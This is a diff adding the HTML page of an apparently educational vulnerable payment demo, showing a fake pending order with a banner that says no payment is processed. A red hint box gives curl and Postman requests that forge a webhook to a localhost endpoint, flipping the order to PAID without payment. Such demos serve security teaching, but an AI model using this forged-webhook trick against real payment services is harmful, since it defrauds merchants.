@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing Payment...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 60px 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .order-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .order-info div {
+            margin: 10px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .order-info strong {
+            color: #667eea;
+        }
+
+        .status {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .status.pending {
+            background: #ffc107;
+            color: #856404;
+        }
+
+        .status.paid {
+            background: #44ff44;
+            color: #155724;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+            border-radius: 4px;
+        }
+
+        .warning-box h3 {
+            color: #856404;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .warning-box p {
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .attack-hint {
+            background: #dc3545;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .attack-hint h3 {
+            margin-bottom: 10px;
+        }
+
+        .attack-hint code {
+            display: block;
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            text-align: left;
+            overflow-x: auto;
+        }
+
+        .check-status-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: all 0.3s;
+        }
+
+        .check-status-btn:hover {
+            background: #5568d3;
+            transform: scale(1.05);
+        }
+
+        .success-message {
+            display: none;
+            background: #44ff44;
+            color: #155724;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .back-btn {
+            display: inline-block;
+            margin-top: 20px;
+            color: #667eea;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .back-btn:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="spinner" id="spinner"></div>
+            
+            <h1>Processing Your Payment</h1>
+            <p style="color: #666; margin: 10px 0;">Please wait while we confirm your order...</p>
+
+            <div class="order-info" id="orderInfo">
+                <div>
+                    <span><strong>Order ID:</strong></span>
+                    <span id="orderId">Loading...</span>
+                </div>
+                <div>
+                    <span><strong>Product:</strong></span>
+                    <span>Premium Course</span>
+                </div>
+                <div>
+                    <span><strong>Amount:</strong></span>
+                    <span>₹999</span>
+                </div>
+                <div>
+                    <span><strong>Status:</strong></span>
+                    <span id="orderStatus" class="status pending">PENDING</span>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h3>⚠️ This is a Fake Payment Page</h3>
+                <p>
+                    No actual payment is being processed. This page is part of the educational demo. 
+                    The order is waiting for a webhook confirmation to change status from PENDING to PAID.
+                </p>
+            </div>
+
+            <button class="check-status-btn" onclick="checkOrderStatus()">
+                🔄 Check Order Status
+            </button>
+
+            <div class="success-message" id="successMessage">
+                🎉 Payment Confirmed! Redirecting to success page...
+            </div>
+
+            <div class="attack-hint">
+                <h3>🔴 HOW TO EXPLOIT THIS VULNERABILITY:</h3>
+                <p style="margin-bottom: 10px;">Use Postman or curl to send a fake webhook:</p>
+                
+                <strong>Using curl:</strong>
+                <code>curl -X POST http://localhost:3000/webhook/payment \
+  -H "Content-Type: application/json" \
+  -d '{
+    "order_id": "<span id="attackOrderId">YOUR_ORDER_ID</span>",
+    "payment_success": true
+  }'</code>
+
+                <strong>Using Postman:</strong>
+                <code>POST http://localhost:3000/webhook/payment
+
+Headers:
+  Content-Type: application/json
+
+Body (JSON):
+{
+  "order_id": "<span id="attackOrderId2">YOUR_ORDER_ID</span>",
+  "payment_success": true
+}</code>
+
+                <p style="margin-top: 15px; font-size: 14px;">
+                    💡 After sending the request, click "Check Order Status" to see it change to PAID!
+                </p>
+            </div>
+
+            <a href="/" class="back-btn">← Back to Home</a>
+        </div>
+    </div>
+
+    <script>
+        // Get order ID from URL
+        const pathParts = window.location.pathname.split('/');
+        const orderId = pathParts[pathParts.length - 1];
+
+        // Display order ID
+        document.getElementById('orderId').textContent = orderId;
+        document.getElementById('attackOrderId').textContent = orderId;
+        document.getElementById('attackOrderId2').textContent = orderId;
+
+        // Function to check order status
+        async function checkOrderStatus() {
+            try {
+                const response = await fetch(`/api/order/${orderId}`);
+                const data = await response.json();
+
+                const statusElement = document.getElementById('orderStatus');
+                
+                if (data.status === 'PAID') {
+                    statusElement.textContent = 'PAID ✅';
+                    statusElement.className = 'status paid';
+                    
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Redirect to success page after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = `/success/${orderId}`;
+                    }, 2000);
+                } else {
+                    statusElement.textContent = 'PENDING ⏳';
+                    statusElement.className = 'status pending';
+                }
+
+                console.log('Order status:', data);
+            } catch (error) {
+                console.error('Error checking order status:', error);
+                alert('Error checking order status. Please try again.');
+            }
+        }
+
+        // Auto-check status every 2 seconds
+        const statusCheckInterval = setInterval(checkOrderStatus, 2000);
+
+        // Initial status check
+        checkOrderStatus();
+
+        // Stop checking after 5 minutes
+        setTimeout(() => {
+            clearInterval(statusCheckInterval);
+        }, 300000);
+    </script>
+</body>
+</html>
